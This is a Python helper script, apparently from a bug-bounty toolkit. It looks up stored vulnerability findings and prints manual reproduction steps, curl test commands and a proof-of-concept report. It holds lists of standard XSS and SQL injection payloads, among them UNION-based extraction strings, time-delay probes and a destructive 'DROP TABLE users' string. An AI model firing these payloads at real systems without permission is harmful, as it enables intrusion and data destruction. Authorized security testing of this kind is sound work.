#!/usr/bin/env python3
"""
🎯 MANUAL VULNERABILITY TESTING HELPER
Step-by-step PoC reproduction for discovered vulnerabilities
"""

import sqlite3
from pathlib import Path
import requests
from urllib.parse import urljoin

DATABASE_PATH = Path.home() / 'bb_pro_workspace' / 'bb_pro.db'

class VulnTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
    
    def get_vulnerability(self, vuln_id):
        """Get vulnerability details from database"""
        try:
            conn = sqlite3.connect(DATABASE_PATH)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT v.*, t.domain
                FROM vulnerabilities v
                JOIN targets t ON v.target_id = t.id
                WHERE v.id = ?
            ''', (vuln_id,))
            
            vuln = cursor.fetchone()
            conn.close()
            
            if vuln:
                return {
                    'id': vuln[0],
                    'vulnerability_type': vuln[2],
                    'severity': vuln[3],
                    'title': vuln[4],
                    'description': vuln[5],
                    'location': vuln[6],
                    'payload': vuln[7],
                    'evidence': vuln[8],
                    'domain': vuln[14]
                }
            return None
        except Exception as e:
            print(f"Database error: {e}")
            return None
    
    def test_xss_vulnerability(self, vuln):
        """Test XSS vulnerability reproduction"""
        print("\n🚨 XSS VULNERABILITY TEST")
        print("=" * 50)
        
        domain = vuln['domain']
        location = vuln['location']
        original_payload = vuln['payload']
        
        print(f"Target: {domain}")
        print(f"Location: {location}")
        print(f"Original Payload: {original_payload}")
        
        # Different XSS payloads to test
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert(document.domain)>",
            "javascript:alert('XSS')",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "\"><script>alert('XSS')</script>",
            "';alert('XSS');//",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')></marquee>"
        ]
        
        print("\n📝 REPRODUCTION STEPS:")
        print("1. Open your browser")
        print(f"2. Navigate to: {domain}")
        print(f"3. Find the vulnerable parameter at: {location}")
        print("4. Try these payloads one by one:")
        
        for i, payload in enumerate(xss_payloads, 1):
            print(f"   {i:2d}. {payload}")
        
        print("\n🔍 WHAT TO LOOK FOR:")
        print("- Alert popup appearing")
        print("- JavaScript execution in browser console")
        print("- Modified DOM structure")
        print("- Network requests to external domains")
        
        print("\n📸 EVIDENCE TO COLLECT:")
        print("- Screenshot of alert popup")
        print("- Browser developer tools showing executed script")
        print("- Network tab showing any external requests")
        print("- Page source showing injected code")
        
        return self.manual_test_url(domain, location, xss_payloads)
    
    def test_sqli_vulnerability(self, vuln):
        """Test SQL injection vulnerability reproduction"""
        print("\n💉 SQL INJECTION VULNERABILITY TEST")
        print("=" * 50)
        
        domain = vuln['domain']
        location = vuln['location']
        original_payload = vuln['payload']
        
        print(f"Target: {domain}")
        print(f"Location: {location}")
        print(f"Original Payload: {original_payload}")
        
        # SQL injection payloads
        sqli_payloads = [
            "'",
            "\"",
            "\\",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "' OR 1=1#",
            "admin'--",
            "admin'#",
            "' UNION SELECT NULL--",
            "' UNION SELECT version()--",
            "' UNION SELECT user(),database()--",
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SELECT SLEEP(5)--",
            "1'; DROP TABLE users--"
        ]
        
        print("\n📝 REPRODUCTION STEPS:")
        print("1. Open Burp Suite or similar proxy")
        print(f"2. Navigate to: {domain}")
        print(f"3. Find the vulnerable parameter at: {location}")
        print("4. Intercept the request and try these payloads:")
        
        for i, payload in enumerate(sqli_payloads, 1):
            print(f"   {i:2d}. {payload}")
        
        print("\n🔍 WHAT TO LOOK FOR:")
        print("- Database error messages")
        print("- Different response times (time-based)")
        print("- Different page content (union-based)")
        print("- Authentication bypass")
        print("- Extracted database information")
        
        print("\n📸 EVIDENCE TO COLLECT:")
        print("- Screenshot of error messages")
        print("- Burp Suite request/response")
        print("- Database version/user information")
        print("- Time delay measurements")
        
        return self.manual_test_url(domain, location, sqli_payloads)
    
    def manual_test_url(self, domain, location, payloads):
        """Provide manual testing instructions"""
        print("\n🛠️ MANUAL TESTING COMMANDS:")
        print("-" * 30)
        
        # Generate curl commands
        for i, payload in enumerate(payloads[:5], 1):  # Show first 5 payloads
            encoded_payload = requests.utils.quote(payload)
            test_url = f"{domain}{location}".replace("FUZZ", encoded_payload)
            
            print(f"\n{i}. Test with curl:")
            print(f"   curl -X GET \"{test_url}\"")
            print(f"   # Payload: {payload}")
        
        print("\n🔧 USING BURP SUITE:")
        print("1. Set browser proxy to 127.0.0.1:8080")
        print("2. Navigate to target URL")
        print("3. Send request to Repeater")
        print("4. Modify parameter with payloads")
        print("5. Analyze responses for differences")
        
        print("\n🔧 USING OWASP ZAP:")
        print("1. Start ZAP and configure browser proxy")
        print("2. Spider the target application")
        print("3. Run active scan on vulnerable parameter")
        print("4. Review scan results and alerts")
        
        return True
    
    def generate_poc_report(self, vuln):
        """Generate a PoC report"""
        report = f"""
# Proof of Concept Report

## Vulnerability Details
- **ID:** {vuln['id']}
- **Type:** {vuln['vulnerability_type']}
- **Severity:** {vuln['severity']}
- **Target:** {vuln['domain']}
- **Location:** {vuln['location']}

## Original Finding
- **Payload:** `{vuln['payload']}`
- **Description:** {vuln['description']}

## Reproduction Steps

### Step 1: Setup
1. Ensure you have proper authorization to test this target
2. Use a controlled testing environment if possible
3. Have Burp Suite or similar proxy tool ready

### Step 2: Navigate to Target
1. Open your browser
2. Navigate to: {vuln['domain']}
3. Locate the vulnerable parameter at: {vuln['location']}

### Step 3: Execute Payload
1. Input the original payload: `{vuln['payload']}`
2. Submit the request
3. Observe the response

### Step 4: Verify Impact
- Check for execution/injection success
- Document any error messages
- Capture screenshots as evidence

## Expected Results
The payload should demonstrate the {vuln['vulnerability_type']} vulnerability by:
{vuln['description']}

## Remediation
- Input validation and sanitization
- Output encoding
- Parameterized queries (for SQL injection)
- Content Security Policy (for XSS)

---
*Report generated by Bug Bounty Hunter Pro*
        """
        
        return report.strip()

def main():
    print("\n🎯 VULNERABILITY REPRODUCTION HELPER")
    print("=" * 50)
    
    tester = VulnTester()
    
    # Get vulnerability ID from user
    try:
        vuln_id = input("Enter vulnerability ID to reproduce: ").strip()
        vuln_id = int(vuln_id)
    except ValueError:
        print("❌ Invalid vulnerability ID")
        return
    
    # Get vulnerability data
    vuln = tester.get_vulnerability(vuln_id)
    if not vuln:
        print("❌ Vulnerability not found")
        return
    
    print(f"\n📋 Analyzing: {vuln['title']}")
    print(f"🎯 Target: {vuln['domain']}")
    print(f"⚠️ Type: {vuln['vulnerability_type']}")
    
    # Route to appropriate test method
    if 'XSS' in vuln['vulnerability_type'].upper():
        tester.test_xss_vulnerability(vuln)
    elif 'SQL' in vuln['vulnerability_type'].upper():
        tester.test_sqli_vulnerability(vuln)
    else:
        print(f"\n📝 GENERIC REPRODUCTION STEPS:")
        print(f"Target: {vuln['domain']}")
        print(f"Location: {vuln['location']}")
        print(f"Payload: {vuln['payload']}")
        print(f"Description: {vuln['description']}")
    
    # Generate report
    print("\n📄 GENERATING POC REPORT...")
    report = tester.generate_poc_report(vuln)
    
    filename = f"poc_report_{vuln_id}.md"
    with open(filename, 'w') as f:
        f.write(report)
    
    print(f"✅ PoC report saved to: {filename}")
    
    # Show summary
    print("\n📋 QUICK REFERENCE:")
    print(f"Target: {vuln['domain']}")
    print(f"Payload: {vuln['payload']}")
    print(f"Location: {vuln['location']}")

if __name__ == "__main__":
    main()
